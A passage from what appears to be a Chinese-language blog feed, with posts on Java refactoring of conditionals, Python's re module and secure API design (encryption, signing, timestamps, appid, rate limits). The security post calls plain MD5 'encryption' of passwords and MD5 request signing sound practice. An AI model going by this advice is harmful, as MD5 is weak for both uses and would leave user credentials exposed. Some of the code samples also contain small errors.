Link<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    map.put(TYPE_IMAGE, Image<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    map.put(TYPE_TEXT, Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    map.put(TYPE_IMAGE_TEXT, ImageText<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ShareItem <span class="title">createShareItem</span><span class="params">(<span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;? extends ShareItem&gt; shareItemClass = map.get(type);</span><br><span class="line">        <span class="keyword">return</span> shareItemClass.newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DefaultShareItem(); <span class="comment">// 返回默认实现，不要返回null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="合并条件表达式"><a href="#合并条件表达式" class="headerlink" title="合并条件表达式"></a>合并条件表达式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重构前</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">disablityAmount</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(_seniority &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(_monthsDisabled &gt; <span class="number">12</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(_isPartTime)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重构后</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">disablityAmount</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(_seniority &lt; <span class="number">2</span> || _monthsDisabled &gt; <span class="number">12</span> || _isPartTime)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="提前return"><a href="#提前return" class="headerlink" title="提前return"></a>提前return</h3><p>改为平行关系，而非包含关系<br>尽可能地维持正常流程代码在最外层</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重构前</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getPayAmount</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> result;</span><br><span class="line">    <span class="keyword">if</span>(_isDead) &#123;</span><br><span class="line">        result = deadAmount();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(_isSeparated)</span><br><span class="line">            result = separatedAmount();</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(_isRetired)</span><br><span class="line">                result = retiredAmount();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                result = normalPayAmount();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重构后</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getPayAmount</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(_isDead)</span><br><span class="line">        <span class="keyword">return</span> deadAmount();</span><br><span class="line">    <span class="keyword">if</span>(_isSeparated)</span><br><span class="line">        <span class="keyword">return</span> separatedAmount();</span><br><span class="line">    <span class="keyword">if</span>(_isRetired)</span><br><span class="line">        <span class="keyword">return</span> retiredAmount();</span><br><span class="line">    <span class="keyword">return</span> normalPayAmount();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将条件反转使异常情况先退出，让正常流程维持在主干流程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重构前</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getAdjustedCapital</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> result = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">if</span>(_capital &gt; <span class="number">0.0</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span>(_intRate &gt; <span class="number">0</span> &amp;&amp; _duration &gt;<span class="number">0</span>)&#123;</span><br><span class="line">            resutl = (_income / _duration) *ADJ_FACTOR;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重构后</span></span><br><span class="line"><span class="comment">// (_income / _duration) *ADJ_FACTOR 是主流程，根据优化原则（尽可能地维持正常流程代码在最外层），放到最外层</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getAdjustedCapital</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(_capital &lt;= <span class="number">0.0</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(_intRate &lt;= <span class="number">0</span> || _duration &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (_income / _duration) *ADJ_FACTOR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="if-else-封装"><a href="#if-else-封装" class="headerlink" title="if-else 封装"></a>if-else 封装</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getPayAmount</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Object obj = getObj();</span><br><span class="line">    <span class="keyword">if</span> (obj.getType == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getType1Money(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj.getType == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getType2Money(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getType1Money</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line">    ObjectA objA = obj.getObjectA();</span><br><span class="line">    <span class="keyword">return</span> objA.getMoney()*obj.getNormalMoneryA();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getType2Money</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line">    ObjectB objB = obj.getObjectB();</span><br><span class="line">    <span class="keyword">return</span> objB.getMoney()*obj.getNormalMoneryB()+<span class="number">1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Refactor Code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use Regex in Python</title>
      <link href="/2020/02/09/Use-Regex-in-Python/"/>
      <url>/2020/02/09/Use-Regex-in-Python/</url>
      
        <content type="html"><![CDATA[<h2 id="原始字符串"><a href="#原始字符串" class="headerlink" title="原始字符串"></a>原始字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原始字符串（raw string）是所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符，通常简称为 r-string。</span></span><br><span class="line"><span class="comment"># 可以用于设定匹配规则时使用</span></span><br><span class="line">print(<span class="string">'\blake'</span>)</span><br><span class="line">print(<span class="string">r'\blake'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lake</span><br><span class="line">    \blake</span><br></pre></td></tr></table></figure><h2 id="正则表达式的使用"><a href="#正则表达式的使用" class="headerlink" title="正则表达式的使用"></a>正则表达式的使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">look_for</span><span class="params">(pat, str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'没有找到'</span> <span class="keyword">if</span> re.search(pat, str) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> re.findall(pat, str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小括号</span></span><br><span class="line">pat = <span class="string">r'beat(s|ed|en|ing)'</span></span><br><span class="line">print( look_for(pat, <span class="string">'beats'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'beated'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'beaten'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'beating'</span>) )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">'s'</span>]</span><br><span class="line">    [<span class="string">'ed'</span>]</span><br><span class="line">    [<span class="string">'en'</span>]</span><br><span class="line">    [<span class="string">'ing'</span>]</span><br><span class="line"></span><br><span class="line">pat = <span class="string">r'(beat(s|ed|en|ing))'</span></span><br><span class="line">print( look_for(pat, <span class="string">'beats'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'beated'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'beaten'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'beating'</span>) )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[(<span class="string">'beats'</span>, <span class="string">'s'</span>)]</span><br><span class="line">    [(<span class="string">'beated'</span>, <span class="string">'ed'</span>)]</span><br><span class="line">    [(<span class="string">'beaten'</span>, <span class="string">'en'</span>)]</span><br><span class="line">    [(<span class="string">'beating'</span>, <span class="string">'ing'</span>)]</span><br><span class="line"></span><br><span class="line">pat = <span class="string">r'(beat(?:s|ed|en|ing))'</span></span><br><span class="line">print( look_for(pat, <span class="string">'beats'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'beated'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'beaten'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'beating'</span>) )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">'beats'</span>]</span><br><span class="line">    [<span class="string">'beated'</span>]</span><br><span class="line">    [<span class="string">'beaten'</span>]</span><br><span class="line">    [<span class="string">'beating'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># \b \B</span></span><br><span class="line">pat = <span class="string">r'\blearn\b'</span></span><br><span class="line">print( look_for(pat, <span class="string">'learn Python'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'relearn Python'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'learning Python'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'relearning Python'</span>) )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">'learn'</span>]</span><br><span class="line">    没有找到</span><br><span class="line">    没有找到</span><br><span class="line">    没有找到</span><br><span class="line"></span><br><span class="line">pat = <span class="string">r'\Blearn\B'</span></span><br><span class="line">print( look_for(pat, <span class="string">'learn Python'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'relearn Python'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'learning Python'</span>) )</span><br><span class="line">print( look_for(pat, <span class="string">'relearning Python'</span>) )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>没有找到</span><br><span class="line">    没有找到</span><br><span class="line">    没有找到</span><br><span class="line">    [<span class="string">'learn'</span>]</span><br></pre></td></tr></table></figure><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># match(pat, str)：检查字符串的开头是否符合某个模式</span></span><br><span class="line"><span class="comment"># 该函数返回的是个对象（包括匹配的子字符串和在句中的位置索引），如果只需要子字符串，需要用 group() 函数。</span></span><br><span class="line"><span class="comment"># 由于值匹配句头，那么句中的 Bryant 无法被匹配到。</span></span><br><span class="line">s = <span class="string">'Kobe Bryant'</span></span><br><span class="line">print( re.match(<span class="string">r'Kobe'</span>, s) )</span><br><span class="line">print( re.match(<span class="string">r'Kobe'</span>, s).group() )</span><br><span class="line">print( re.match(<span class="string">r'Bryant'</span>, s) )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">4</span>), match=<span class="string">'Kobe'</span>&gt;</span><br><span class="line">    Kobe</span><br><span class="line">    <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search(pat, str)：检查字符串中是否符合某个模式，但只匹配第一个</span></span><br><span class="line">s = <span class="string">'Kobe Bryant'</span></span><br><span class="line">print( re.search(<span class="string">r'Kobe'</span>, s) )</span><br><span class="line">print( re.search(<span class="string">r'Kobe'</span>, s).group() )</span><br><span class="line">print( re.search(<span class="string">r'Bryant'</span>, s) )</span><br><span class="line">print( re.search(<span class="string">r'Bryant'</span>, s).group() )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">4</span>), match=<span class="string">'Kobe'</span>&gt;</span><br><span class="line">    Kobe</span><br><span class="line">    &lt;re.Match object; span=(<span class="number">5</span>, <span class="number">11</span>), match=<span class="string">'Bryant'</span>&gt;</span><br><span class="line">    Bryant</span><br><span class="line"></span><br><span class="line"><span class="comment"># findall(pat, str)：返回所有符合某个模式的字符串，以列表形式输出</span></span><br><span class="line">s = <span class="string">'Kobe Bryant loves Gianna Bryant'</span></span><br><span class="line">print( re.findall(<span class="string">r'Kobe'</span>, s) )</span><br><span class="line">print( re.findall(<span class="string">r'Bryant'</span>, s) )</span><br><span class="line">print( re.findall(<span class="string">r'Gigi'</span>, s) )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">'Kobe'</span>]</span><br><span class="line">    [<span class="string">'Bryant'</span>, <span class="string">'Bryant'</span>]</span><br><span class="line">    []</span><br><span class="line"></span><br><span class="line"><span class="comment"># finditer(pat, str)：返回所有符合某个模式的字符串，以迭代器形式输出</span></span><br><span class="line"><span class="comment"># 如果需要匹配子串在原句中的位置索引，用 finditer，此外用 findall。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># split(pat, str)：以某个模式为分割点，拆分整个句子为一系列字符串，以列表形式输出</span></span><br><span class="line">s = <span class="string">'Kobe Bryant loves Gianna Bryant'</span></span><br><span class="line">print( re.split(<span class="string">r'\s'</span>, s) )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">'Kobe'</span>, <span class="string">'Bryant'</span>, <span class="string">'loves'</span>, <span class="string">'Gianna'</span>, <span class="string">'Bryant'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sub(pat, repl, str)：句子 str 中找到匹配正则表达式模式的所有子字符串，用另一个字符串 repl 进行替换</span></span><br><span class="line">s = <span class="string">'Kobe Bryant loves Gianna Bryant'</span></span><br><span class="line">print( re.sub(<span class="string">r'\s'</span>, <span class="string">'-'</span>, s) )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Kobe-Bryant-loves-Gianna-Bryant</span><br><span class="line"></span><br><span class="line"><span class="comment"># compile(pat)：将某个模式编译成对象，供之后使用，如match 和 search 使用</span></span><br><span class="line">email = <span class="string">'''Shengyuan Personal: quantsteven@gmail.com</span></span><br><span class="line"><span class="string">Shengyuan Work: shengyuan@octagon-advisors.com</span></span><br><span class="line"><span class="string">Shengyuan School: g0700508@nus.edu.sg</span></span><br><span class="line"><span class="string">Obama: barack.obama@whitehouse.gov'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pat = <span class="string">r'[\w.-]+@[\w.-]+'</span></span><br><span class="line">obj = re.compile(pat)</span><br><span class="line">obj</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.compile(<span class="string">r'[\w.-]+@[\w.-]+'</span>, re.UNICODE)</span><br><span class="line"></span><br><span class="line">print( obj.match(email), <span class="string">'\n'</span>)</span><br><span class="line">print( obj.search(email), <span class="string">'\n'</span> )</span><br><span class="line">print( obj.findall(email), <span class="string">'\n'</span> )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="literal">None</span></span><br><span class="line">    &lt;re.Match object; span=(<span class="number">20</span>, <span class="number">41</span>), match=<span class="string">'quantsteven@gmail.com'</span>&gt; </span><br><span class="line">    [<span class="string">'quantsteven@gmail.com'</span>,</span><br><span class="line">    <span class="string">'shengyuan@octagon-advisors.com'</span>,</span><br><span class="line">    <span class="string">'g0700508@nus.edu.sg'</span>,</span><br><span class="line">    <span class="string">'barack.obama@whitehouse.gov'</span>]</span><br><span class="line"></span><br><span class="line">obj1 = re.compile(<span class="string">r'@'</span>)</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> obj.findall(email):</span><br><span class="line">    print( obj1.split(addr))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">'quantsteven'</span>, <span class="string">'gmail.com'</span>]</span><br><span class="line">    [<span class="string">'shengyuan'</span>, <span class="string">'octagon-advisors.com'</span>]</span><br><span class="line">    [<span class="string">'g0700508'</span>, <span class="string">'nus.edu.sg'</span>]</span><br><span class="line">    [<span class="string">'barack.obama'</span>, <span class="string">'whitehouse.gov'</span>]</span><br></pre></td></tr></table></figure><h2 id="常量模块"><a href="#常量模块" class="headerlink" title="常量模块"></a>常量模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常量可叠加使用，因为常量值都是2的幂次方值，所以是可以叠加使用的，叠加时请使用 | 符号</span></span><br><span class="line"><span class="comment"># 使用举例</span></span><br><span class="line">re.findall(pattern, string, re.模块)</span><br><span class="line"></span><br><span class="line"><span class="comment"># re.IGNORECASE / re.I : 忽略大小写</span></span><br><span class="line"><span class="comment"># re.ASCII / re.A : 只匹配 ASCII 码，让 \w,\W,\b,\B,\d,\D,\s和\S 只匹配ASCII， 不匹配 Unicode 等其他码</span></span><br><span class="line"><span class="comment"># re.DOTALL / re.S : 让 . 能匹配所有，包括换行符\n。默认模式下 . 是不能匹配行符\n的</span></span><br><span class="line"><span class="comment"># re.MULTILINE / re.M : 多行模式，当某字符串中有换行符\n，默认模式下是不支持换行符特性的，比如：行开头 和 行结尾，而多行模式下是支持匹配行开头的。</span></span><br><span class="line"><span class="comment"># re.VERBOSE / re.X : 详细模式，可以在正则表达式中加注解！</span></span><br><span class="line"><span class="comment"># re.UNICODE / re.U : 与 ASCII 模式类似，匹配unicode编码支持的字符，但是 Python 3 默认字符串已经是Unicode，所以有点冗余。</span></span><br><span class="line"><span class="comment"># re.DEBUG : 显示编译时的debug信息</span></span><br></pre></td></tr></table></figure><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># re模块还包含了一个正则表达式的编译错误</span></span><br><span class="line"><span class="comment"># 当我们给出的正则表达式是一个无效的表达式（就是表达式本身有问题）时，就会raise一个异常</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Regex </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Design A Secure API</title>
      <link href="/2020/02/01/Design-A-Secure-API/"/>
      <url>/2020/02/01/Design-A-Secure-API/</url>
      
        <content type="html"><![CDATA[<h2 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h2><h3 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h3><p>我们知道数据在传输过程中是很容易被抓包的，如果直接传输比如通过 http 协议，那么用户传输的数据可以被任何人获取；所以必须对数据加密，常见的做法对关键字段加密比如用户密码直接通过 md5 加密；现在主流的做法是使用 https 协议，在 http 和 tcp 之间添加一层加密层(SSL 层)，这一层负责数据的加密和解密；</p><h3 id="数据加签"><a href="#数据加签" class="headerlink" title="数据加签"></a>数据加签</h3><p>数据加签就是由发送者产生一段无法伪造的一段数字串，来保证数据在传输过程中不被篡改；你可能会问数据如果已经通过 https 加密了，还有必要进行加签吗？数据在传输过程中经过加密，理论上就算被抓包，也无法对数据进行篡改；但是我们要知道加密的部分其实只是在外网，现在很多服务在内网中都需要经过很多服务跳转，所以这里的加签可以防止内网中数据被篡改；</p><h3 id="时间戳机制"><a href="#时间戳机制" class="headerlink" title="时间戳机制"></a>时间戳机制</h3><p>数据是很容易被抓包的，但是经过如上的加密，加签处理，就算拿到数据也不能看到真实的数据；但是有不法者不关心真实的数据，而是直接拿到抓取的数据包进行恶意请求；这时候可以使用时间戳机制，在每次请求中加入当前的时间，服务器端会拿到当前时间和消息中的时间相减，看看是否在一个固定的时间范围内比如 5 分钟内；这样恶意请求的数据包是无法更改里面时间的，所以 5 分钟后就视为非法请求了；</p><h3 id="AppId-机制"><a href="#AppId-机制" class="headerlink" title="AppId 机制"></a>AppId 机制</h3><p>大部分网站基本都需要用户名和密码才能登录，并不是谁来能使用我的网站，这其实也是一种安全机制；对应的对外提供的接口其实也需要这么一种机制，并不是谁都可以调用，需要使用接口的用户需要在后台开通 appid，提供给用户相关的密钥；在调用的接口中需要提供 appid+密钥，服务器端会进行相关的验证；</p><h3 id="限流机制"><a href="#限流机制" class="headerlink" title="限流机制"></a>限流机制</h3><p>本来就是真实的用户，并且开通了 appid，但是出现频繁调用接口的情况；这种情况需要给相关 appid 限流处理，常用的限流算法有令牌桶和漏桶算法；</p><h3 id="黑名单机制"><a href="#黑名单机制" class="headerlink" title="黑名单机制"></a>黑名单机制</h3><p>如果此 appid 进行过很多非法操作，或者说专门有一个中黑系统，经过分析之后直接将此 appid 列入黑名单，所有请求直接返回错误码；</p><h3 id="数据合法性校验"><a href="#数据合法性校验" class="headerlink" title="数据合法性校验"></a>数据合法性校验</h3><p>这个可以说是每个系统都会有的处理机制，只有在数据是合法的情况下才会进行数据处理；每个系统都有自己的验证规则，当然也可能有一些常规性的规则，比如身份证长度和组成，电话号码长度和组成等等；</p><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><h3 id="数据加密-1"><a href="#数据加密-1" class="headerlink" title="数据加密"></a>数据加密</h3><p>现在主流的加密方式有对称加密和非对称加密；</p><h4 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h4><blockquote><p>对称密钥在加密和解密的过程中使用的密钥是相同的，常见的对称加密算法有 DES，AES；优点是计算速度快，缺点是在数据传送前，发送方和接收方必须商定好秘钥，然后使双方都能保存好秘钥，如果一方的秘钥被泄露，那么加密信息也就不安全了；</p></blockquote><h4 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h4><blockquote><p>服务端会生成一对密钥，私钥存放在服务器端，公钥可以发布给任何人使用；优点就是比起对称加密更加安全，但是加解密的速度比对称加密慢太多了；广泛使用的是 RSA 算法；</p></blockquote><p>两种方式各有优缺点，而 https 的实现方式正好是结合了两种加密方式，整合了双方的优点，在安全和性能方面都比较好；</p><h3 id="数据加签-1"><a href="#数据加签-1" class="headerlink" title="数据加签"></a>数据加签</h3><p>数据签名使用比较多的是 md5 算法，将需要提交的数据通过某种方式组合和一个字符串，然后通过 md5 生成一段加密字符串，这段加密字符串就是数据包的签名，可以看一个简单的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str：参数1&#x3D;&#123;参数1&#125;&amp;参数2&#x3D;&#123;参数2&#125;&amp;……&amp;参数n&#x3D;&#123;参数n&#125;$key&#x3D;&#123;用户密钥&#125;;</span><br><span class="line">MD5.encrypt(str);</span><br></pre></td></tr></table></figure><p>注意最后的用户密钥，客户端和服务端都有一份，这样会更加安全；</p><h3 id="时间戳机制-1"><a href="#时间戳机制-1" class="headerlink" 